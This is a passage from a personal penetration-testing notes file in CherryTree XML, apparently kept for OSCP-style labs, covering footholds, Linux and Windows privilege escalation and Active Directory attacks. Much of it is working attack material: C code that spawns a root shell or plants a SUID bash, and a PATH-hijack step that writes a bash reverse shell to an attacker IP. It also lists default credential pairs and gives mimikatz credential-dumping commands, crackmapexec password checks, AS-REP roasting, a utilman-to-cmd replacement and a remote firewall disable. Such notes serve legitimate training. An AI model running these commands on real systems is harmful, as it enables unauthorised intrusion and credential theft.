        <rich_text>)?
- Can you think of a way to find more information: More credentials, more URLs, more files, more ports, more access?
- Try usernames found with </rich_text>
        <rich_text weight="heavy">capital letter</rich_text>
        <rich_text>, all </rich_text>
        <rich_text weight="heavy">letters capital</rich_text>
        <rich_text>
- Do you need to relax some of the terms used for searching? Instead of v2.8 maybe we check for anything under 3.
- </rich_text>
        <rich_text weight="heavy">exiftool</rich_text>
        <rich_text> on every strange file
- Do you need a break?

- If reverse shell is not working, try transferring a msfvenom payload and executing it instead
- If commands are not recognized, use their absolute path, for example </rich_text>
        <rich_text weight="heavy">powershell not recongnized</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text weight="heavy">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</rich_text>
        <rich_text>

- Check </rich_text>
        <rich_text weight="heavy">certificates</rich_text>
        <rich_text>, maybe we find an interesting domain to add to our </rich_text>
        <rich_text style="italic">/etc/hosts</rich_text>
        <rich_text> to get a new website
- If it is an open-source application, check their repo, maybe you will fins something interesting

- Hashes to try if needed:
   → MD5
   → SHA256
   → BCrypt

----------------------- FROM </rich_text>
        <rich_text link="webs https://dev.to/hackin7/proving-grounds-tips-50ae">https://dev.to/hackin7/proving-grounds-tips-50ae</rich_text>
        <rich_text>
- The firewall of the machines may be configured to prevent reverse shell connections to most ports except the application ports =&gt; Use application port on your attacking machine for reverse shell
- </rich_text>
        <rich_text weight="heavy">admin:admin</rich_text>
        <rich_text>, </rich_text>
        <rich_text weight="heavy">admin:password</rich_text>
        <rich_text>, </rich_text>
        <rich_text weight="heavy">guest:guest</rich_text>
        <rich_text>, </rich_text>
        <rich_text weight="heavy">backup:backup</rich_text>
        <rich_text>, </rich_text>
        <rich_text weight="heavy">&lt;username&gt;:&lt;username&gt;</rich_text>
        <rich_text>, </rich_text>
        <rich_text style="italic">default credentials</rich_text>
        <rich_text>, </rich_text>
        <rich_text style="italic">reused credentials</rich_text>
        <rich_text>
- Google exploits, not just </rich_text>
        <rich_text style="italic">searchsploit</rich_text>
        <rich_text>. Found many exploits this way
- If the </rich_text>
        <rich_text weight="heavy">ftp</rich_text>
        <rich_text> command doesn't work, try </rich_text>
        <rich_text style="italic">passive</rich_text>
        <rich_text> </rich_text>
        <rich_text style="italic">mode</rich_text>
        <rich_text>, or </rich_text>
        <rich_text weight="heavy">pftp</rich_text>
        <rich_text>. Same thing for vice versa

----------------------- FOOTHOLD PROBLEMS
- Try </rich_text>
        <rich_text weight="heavy">bind shell</rich_text>
        <rich_text> if reverse won't work

!!! </rich_text>
        <rich_text weight="heavy">Very important: </rich_text>
        <rich_text style="italic" weight="heavy">When absolutely nothing works, just cewl a wordlist and start bruteforcing</rich_text>
        <rich_text weight="heavy">.</rich_text>
        <rich_text>
Maybe try </rich_text>
        <rich_text link="webs https://github.com/r3nt0n/bopscrk">https://github.com/r3nt0n/bopscrk</rich_text>
        <rich_text> BOPSCRK to create a wordlist.

Use:
</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="2679" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">tcpdump -i tun0 icmp
# and try to ping from the other machine
# maybe we already achieved RCE</codebox>
      </node>
    </node>
    <node name="PRIVILEGE ESCALATION" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1688917213" ts_lastsave="1694629539">
      <rich_text>We have to pay attention to </rich_text>
      <rich_text weight="heavy">files on the machine</rich_text>
      <rich_text>, most of the time, this is how privilege escalation is done.

Good to know, </rich_text>
      <rich_text style="italic">shell in C/C++</rich_text>
      <rich_text>:
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

Alternative for </rich_text>
      <rich_text style="italic">C/C++ shell</rich_text>
      <rich_text>:
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

Compile </rich_text>
      <rich_text style="italic">SO file</rich_text>
      <rich_text>: 
</rich_text>
      <rich_text justification="left"></rich_text>
      <codebox char_offset="141" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
void test_this()
{
	setuid(0); setgid(0); system("/bin/sh");
}</codebox>
      <codebox char_offset="173" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void inject() _attribute_((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p");
}</codebox>
      <codebox char_offset="194" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gcc -fPIC -shared test_this.c -o test_this.so</codebox>
      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1694352079">
        <rich_text>Use:
- linpeas
- kernel exploit suggester

Check kernel manually:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">!Important</rich_text>
        <rich_text>: If we don't have GCC to compille on the box, and we encounter errors when we try to execute the locally compiled exploit, we need to simulate the exploited environment, check this: </rich_text>
        <rich_text link="webs https://github.com/X0RW3LL/XenSpawn">https://github.com/X0RW3LL/XenSpawn</rich_text>
        <rich_text>.

Check files manually:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
- Check </rich_text>
        <rich_text style="italic">/opt</rich_text>
        <rich_text> directory
- Check if </rich_text>
        <rich_text style="italic">/etc/passwd</rich_text>
        <rich_text> writable
- Check if </rich_text>
        <rich_text style="italic">/etc/shadow</rich_text>
        <rich_text> readable/writable
- Check group that we are in with </rich_text>
        <rich_text style="italic">id</rich_text>
        <rich_text> and see what permissions it gives to us (for example, </rich_text>
        <rich_text style="italic">adm</rich_text>
        <rich_text> has access to read logs)

Manually check:
- SUID
- SGID
- Cronjobs (</rich_text>
        <rich_text style="italic">crontab -l</rich_text>
        <rich_text>)
- Check logs for cronjobs
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
- Check insecure system components with </rich_text>
        <rich_text style="italic">getcap</rich_text>
        <rich_text>
- Check processes with </rich_text>
        <rich_text style="italic">ps aux</rich_text>
        <rich_text>

Check capabilities:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Check opened ports:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Check running commands:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Use </rich_text>
        <rich_text weight="heavy">PSpy</rich_text>
        <rich_text> to check for executed commands and cronjobs, without </rich_text>
        <rich_text style="italic">privilege escalation</rich_text>
        <rich_text>.</rich_text>
        <codebox char_offset="66" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uname -a</codebox>
        <codebox char_offset="321" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -04000 2&gt;/dev/null</codebox>
        <codebox char_offset="620" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
        <codebox char_offset="720" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">getcap -r / 2&gt;/dev/null
# And search for everyone</codebox>
        <codebox char_offset="743" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">netstat -tulpn
# Maybe we can interact with an internal opened port?</codebox>
        <codebox char_offset="770" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ps -eo</codebox>
        <node name="Special Cases" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690221496" ts_lastsave="1693945549">
          <rich_text>---------------------- Services and Reboot Privs ----------------------
If we have these SUDO capabilities (sudo -l):
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
We may find writable services inside etc:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Then we may overwrite this service with one that executes a reverse shell from root, then </rich_text>
          <rich_text weight="heavy">sudo reboot</rich_text>
          <rich_text>.
More on it here: </rich_text>
          <rich_text link="webs https://security.stackexchange.com/a/264911">https://security.stackexchange.com/a/264911</rich_text>
          <rich_text>

---------------------- Custom SUIDs ----------------------
If a strange binary is found as SUID, check it's system calls:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
This may be vulnerable to path injection.
More on that here: </rich_text>
          <rich_text link="webs https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469">https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469</rich_text>
          <rich_text> and </rich_text>
          <rich_text link="webs https://medium.com/purplebox/linux-privilege-escalation-with-path-variable-suid-bit-6b9c492411de">https://medium.com/purplebox/linux-privilege-escalation-with-path-variable-suid-bit-6b9c492411de</rich_text>
          <rich_text>

---------------------- Check if we are in a container ----------------------
!Check if we are in a container:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
More details here: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation</rich_text>
          <rich_text>.

---------------------- Restricted shell ----------------------
If we have a restricted shell, or a shell that won't give us output, we can try ssh into localhost, as a different user:
</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="118" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">User lowpriv may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff</codebox>
          <codebox char_offset="162" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find /etc -writable 2&gt;/dev/null
./systemd/system/normal.service</codebox>
          <codebox char_offset="452" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ltrace {binary} # This will load the executable and print every system call
# If any systemcall is not with absolute path, we can inject into path:
export PATH=/tmp:$PATH
# and add to that path a reverse shell with the name of that binary system call (called without absolute path)
echo 'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.118.3/4444 0&gt;&amp;1"' &gt; /tmp/{binary}
chmod +x /tmp/{binary}
</codebox>
          <codebox char_offset="827" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname
# If we get gibberish data like "f8e1a236869d", we are in a container and we should escape it =&gt; see services that are on the machine and we could exploit
# (other services maybe be run by machine itself, not container, and we could gather info about those services from inside the container, to gain RCE
# of them from outside)
# Also check for .dockerenv file in root directory /.dockerenv =&gt; we are in a container</codebox>
          <codebox char_offset="1152" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh user@localhost {some command}
Example:
ssh user@localhost sudo ufw disable</codebox>
        </node>
      </node>
      <node name="Windows" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924320" ts_lastsave="1694629592">
        <rich_text>Use (and read CAREFULLY the output):
- winpeas
- PowerUp
- SharpUp
- Sherlock.psq (for kernel exploits)

Pay attention on privilegeges of the user:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
Check the group of the user, maybe we have backup operator
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
Check files using powershell:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
Extensions to check:
- sql
- sqlite
- db
- txt
- pdf
- doc
- docx
- ps1
- ini
- kdbx (See KeePass)

</rich_text>
        <rich_text weight="heavy">Important:</rich_text>
        <rich_text> Check all files, maybe we have </rich_text>
        <rich_text style="italic">Windows.old</rich_text>
        <rich_text> to extract SAM. Extract it with both </rich_text>
        <rich_text weight="heavy">samdump2</rich_text>
        <rich_text> and </rich_text>
        <rich_text weight="heavy">impacket-secretsdump</rich_text>
        <rich_text>.
Check this: </rich_text>
        <rich_text link="webs https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/#Extracting_the_Hashes_with_secretsdumppy_and_samdump2">https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/#Extracting_the_Hashes_with_secretsdumppy_and_samdump2</rich_text>
        <rich_text>

Check scheduled tasks manually
Check services manually
Check active sessions (PowerView):
- </rich_text>
        <rich_text style="italic">NetWkstaUserEnum</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
- </rich_text>
        <rich_text style="italic">NetSessionEnum</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

- Check opened ports:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Check information of the system with </rich_text>
        <rich_text style="italic" weight="heavy">systeminfo</rich_text>
        <rich_text>:
Then we use build number and last patch to search for a possible exploit.

Note, for cross compiling, mingw-w64 calls:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text style="italic" weight="heavy">!Important:</rich_text>
        <rich_text> When discovering a new suspicious service/scheduled job, first try to replace the actual EXE, after that, if won't work, try replacing the dependend DLL (if it is the case).
Regarding services, after replacing binary, restart the system with:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

- </rich_text>
        <rich_text weight="heavy">SharpUp</rich_text>
        <rich_text> in addition to </rich_text>
        <rich_text weight="heavy">PowerUp</rich_text>
        <codebox char_offset="148" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">whoami /all
whoami /priv</codebox>
        <codebox char_offset="209" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">whoami /group</codebox>
        <codebox char_offset="241" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-ChildItem -Filter *.txt -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Fullname</codebox>
        <codebox char_offset="709" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetLoggedon</codebox>
        <codebox char_offset="728" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetSession</codebox>
        <codebox char_offset="753" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">netstat -ano
# Maybe we can interact with an internal opened port</codebox>
        <codebox char_offset="924" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">i686-w64-mingw32-gcc   - Win x32
x86_64-w64-mingw32-gcc - Win x64</codebox>
        <codebox char_offset="1182" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">shutdown /r</codebox>
        <node name="Important" unique_id="119" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693136040" ts_lastsave="1694629660">
          <rich_text>When we cannot read the winpeas output on kali machine, we have to use:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

UAC Bypass:
- UACME HFIREF0X - </rich_text>
          <rich_text link="webs https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</rich_text>
          <rich_text>
- UAC-Bypass - </rich_text>
          <rich_text link="webs https://github.com/k4sth4/UAC-bypass">https://github.com/k4sth4/UAC-bypass</rich_text>
          <codebox char_offset="72" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dos2unix -f outputwinpeas.txt # will convert to readable file on *NIX systems
# Then
less -r outputwinpeas.txt</codebox>
        </node>
      </node>
      <node name="STUCK?" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1689415044" ts_lastsave="1693324956">
        <rich_text>- Recheck every line of output from Winpeas/Linpeas
- Recheck files
- Rerun Winpeas/Linpeas

- If in AD, try SharpHound and analyze object ACL - </rich_text>
        <rich_text weight="heavy">Only Windows</rich_text>
        <rich_text>
- Search the build number for privilege escalation exploits - </rich_text>
        <rich_text weight="heavy">Only Windows</rich_text>
        <rich_text>
- Check kernel or build exploit and try them all from WinPeas - </rich_text>
        <rich_text weight="heavy">Only Windows</rich_text>
        <rich_text>
- Check Installed software in </rich_text>
        <rich_text weight="heavy">Program Files</rich_text>
        <rich_text> and </rich_text>
        <rich_text weight="heavy">Program Files x86</rich_text>
        <rich_text>, maybe it is a public exploit - </rich_text>
        <rich_text weight="heavy">Only Windows</rich_text>
        <rich_text>
- Check if there is a binary that </rich_text>
        <rich_text weight="heavy">backups</rich_text>
        <rich_text> or does a </rich_text>
        <rich_text weight="heavy">job that may be a service or a scheduled job </rich_text>
        <rich_text>and replace with a reverse shell - </rich_text>
        <rich_text weight="heavy">Only Windows</rich_text>
        <rich_text>
- If no hotfixes are available, check</rich_text>
        <rich_text weight="heavy"> C:\Windows\SoftwareDistribution\Download</rich_text>
        <rich_text>

- Always check </rich_text>
        <rich_text weight="heavy">GTFOBins</rich_text>
        <rich_text> for SUIDs and SUDO capabilities (No matter if it look not probable) - </rich_text>
        <rich_text weight="heavy">Only Linux</rich_text>
        <rich_text>
- Always check kernel version and try all exploits -</rich_text>
        <rich_text weight="heavy"> Only Linux</rich_text>
        <rich_text>
- Try </rich_text>
        <rich_text style="italic">already known passwords</rich_text>
        <rich_text> to </rich_text>
        <rich_text weight="heavy">sudo</rich_text>
        <rich_text> or switch user (</rich_text>
        <rich_text weight="heavy">su</rich_text>
        <rich_text>) to root - </rich_text>
        <rich_text style="italic" weight="heavy">Password Reusal</rich_text>
        <rich_text> - </rich_text>
        <rich_text weight="heavy">Only Linux</rich_text>
        <rich_text>

!For some reason </rich_text>
        <rich_text style="italic">samdump2</rich_text>
        <rich_text> failed here as the both the NT and LM are coming up as blank for all accounts. T</rich_text>
        <rich_text weight="heavy">his is exactly why we need to have multiple tools to accomplish a single task. When one fails, we can try another.</rich_text>
      </node>
    </node>
    <node name="AD" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1569561597" ts_lastsave="1693140125">
      <rich_text>Check this cheatsheet: </rich_text>
      <rich_text link="webs https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md">https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md</rich_text>
      <rich_text>

Make sure to use </rich_text>
      <rich_text weight="heavy">PowerView</rich_text>
      <rich_text>. Here is a cheatsheet: </rich_text>
      <rich_text link="webs https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet">https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet</rich_text>
      <rich_text>.</rich_text>
      <node name="Post-Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569563672" ts_lastsave="1690126271">
        <rich_text>We will use </rich_text>
        <rich_text weight="heavy">mimikatz</rich_text>
        <rich_text>:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
Then we will extract using every method, beginning with:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
Do not forget to check </rich_text>
        <rich_text weight="heavy">cached credentials</rich_text>
        <rich_text>.
Als check out this: </rich_text>
        <rich_text link="webs https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49">https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49</rich_text>
        <rich_text>
Make sure to extract all.

Rerun </rich_text>
        <rich_text style="italic">winpeas</rich_text>
        <rich_text> as admin to extract possible interesting data.

Use </rich_text>
        <rich_text weight="heavy">SharpHound</rich_text>
        <rich_text> and </rich_text>
        <rich_text weight="heavy">BloodHound</rich_text>
        <rich_text> to detect possible misconfigurations.

Check </rich_text>
        <rich_text weight="heavy">every file</rich_text>
        <rich_text>, recheck </rich_text>
        <rich_text weight="heavy">logs</rich_text>
        <rich_text>, and </rich_text>
        <rich_text weight="heavy">every user directory</rich_text>
        <rich_text>.

Make sure to check every </rich_text>
        <rich_text weight="heavy">PSReadLine directory</rich_text>
        <rich_text> for </rich_text>
        <rich_text weight="heavy">Console history</rich_text>
        <rich_text>, for </rich_text>
        <rich_text weight="heavy">every user</rich_text>
        <rich_text>.

Make sure to check the </rich_text>
        <rich_text weight="heavy">default password</rich_text>
        <rich_text>.

Try </rich_text>
        <rich_text weight="heavy">Kerberoasting</rich_text>
        <rich_text> and </rich_text>
        <rich_text weight="heavy">AS-Rep</rich_text>
        <rich_text> using valid credentials (</rich_text>
        <rich_text weight="heavy">Impacket suite</rich_text>
        <rich_text>), or a valid sessions (</rich_text>
        <rich_text weight="heavy">Rubeus</rich_text>
        <rich_text>).

Also check this link: </rich_text>
        <rich_text link="webs https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1">https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1</rich_text>
        <rich_text>.</rich_text>
        <codebox char_offset="22" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">privilege::debug # this will allow us to temper with LSASS
token::elevate # this will make us nt_authority</codebox>
        <codebox char_offset="81" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sekurlsa::logonpasswords
lsadump::sam</codebox>
        <node name="Good To Do" unique_id="114" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690114316" ts_lastsave="1690115966">
          <rich_text>If we have admin we may be able to do more from RDP, so we should enable RDP:
</rich_text>
          <rich_text link="webs https://cloudzy.com/blog/enable-rdp-cmd/">https://cloudzy.com/blog/enable-rdp-cmd/</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/crazywifi/Enable-RDP-One-Liner-CMD">https://github.com/crazywifi/Enable-RDP-One-Liner-CMD</rich_text>
        </node>
      </node>
      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1694367251">
        <rich_text>Try credentials using crackmapexec:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
Every possible </rich_text>
        <rich_text weight="heavy">username</rich_text>
        <rich_text> and </rich_text>
        <rich_text weight="heavy">password</rich_text>
        <rich_text> must be stored in a file to check for later use.

If </rich_text>
        <rich_text weight="heavy">valid credentials</rich_text>
        <rich_text> are found, we should try </rich_text>
        <rich_text weight="heavy">evil-winrm</rich_text>
        <rich_text> and </rich_text>
        <rich_text weight="heavy">RDP</rich_text>
        <rich_text> into the machine, even if we don't have local admin with those creds.

Use </rich_text>
        <rich_text weight="heavy">crackmapexec</rich_text>
        <rich_text> and </rich_text>
        <rich_text weight="heavy">smbclient</rich_text>
        <rich_text> to surf the shares.

Also check this link: </rich_text>
        <rich_text link="webs https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#b769">https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#b769</rich_text>
        <rich_text>

We can use </rich_text>
        <rich_text style="italic">bloodhound-python</rich_text>
        <rich_text> to enumerate bloodhound without access to the machine, only having valid creds of an unprivileged user:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Try moving lateraly with:
- RDP
- WinRM
- PSExec (we can do it from kali with </rich_text>
        <rich_text weight="heavy">psexec.py</rich_text>
        <rich_text> - </rich_text>
        <rich_text weight="heavy">impacket-psexec</rich_text>
        <rich_text>)
- RunAS: </rich_text>
        <rich_text link="webs https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas#runascs">https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas#runascs</rich_text>
        <rich_text>

You can AR REP wihtour user credentials (maybe Kerberoast without user credentials?):
</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="36" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator # this will check domain users credentials
proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator --local-auth # this will check local users credentials
</codebox>
        <codebox char_offset="578" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python -d {domain name} -ns {dc-ip} -c All -u {user} -p {password} --zip</codebox>
        <codebox char_offset="870" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers -request -dc-ip 10.129.103.173 htb.local/svc-alfresco -outputfile hashes.kerberoast -no-pass</codebox>
      </node>
      <node name="File Transfer" unique_id="115" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1690116035" ts_lastsave="1690116187">
        <rich_text>We can transfer files from the machine by port forwarding SCP port 6000 to 22 kali (from the Pivot Machine):
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

If we don't have an interactive shell, we can use this to transfer using </rich_text>
        <rich_text weight="heavy">scp</rich_text>
        <rich_text>:
Then we can transfer the files from the attacked machine:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

!Always use </rich_text>
        <rich_text weight="heavy">scp</rich_text>
        <rich_text> from </rich_text>
        <rich_text weight="heavy">putty</rich_text>
        <rich_text> (pscp.exe).</rich_text>
        <codebox char_offset="109" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\plink.exe -ssh -l kali -pw "password" -N -L 0.0.0.0:6000:127.0.0.1:22 {kali IP}</codebox>
        <codebox char_offset="248" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">echo "y" | .\scp.exe -P 6000 file kali@{pivot IP}:file # this is to accespt the key
echo "password" | .\scp.exe -P 6000 file kali@{pivot IP}:file # the actual transfer</codebox>
      </node>
      <node name="STUCK?" unique_id="116" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1690137934" ts_lastsave="1694629699">
        <rich_text>- Try </rich_text>
        <rich_text weight="heavy">spraying the credentials</rich_text>
        <rich_text>, maybe a password is reused by another user (but </rich_text>
        <rich_text weight="heavy">watch out for account lockouts</rich_text>
        <rich_text>)
- Check for password reusal
- Check </rich_text>
        <rich_text weight="heavy">shares</rich_text>
      </node>
      <node name="Interesting Cases" unique_id="120" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693140125" ts_lastsave="1693404762">
        <rich_text>If we find that we have </rich_text>
        <rich_text weight="heavy">PrincipalsAllowedToRetrieveManagedPassword</rich_text>
        <rich_text> (we have an allowed group) permissions to extract passwords, use: </rich_text>
        <rich_text link="webs https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe">https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe</rich_text>
        <rich_text>.

If we have </rich_text>
        <rich_text weight="heavy">SeRestore</rich_text>
        <rich_text> permissions, follow this:
1. Now we will be able to access anything from </rich_text>
        <rich_text weight="heavy">C:\Windows\System32</rich_text>
        <rich_text>.
2. Now, we will replace utilman with CMD:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
3. </rich_text>
        <rich_text weight="heavy">Utilman.exe</rich_text>
        <rich_text> is triggered in </rich_text>
        <rich_text weight="heavy">RDP</rich_text>
        <rich_text> by using </rich_text>
        <rich_text weight="heavy">WIN+U</rich_text>
        <rich_text> in RDP.

Or try this: </rich_text>
        <rich_text link="webs https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe">https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe</rich_text>
        <rich_text>.


</rich_text>
        <rich_text weight="heavy">SeBackupPrivilege</rich_text>
        <rich_text> - use this tutorial </rich_text>
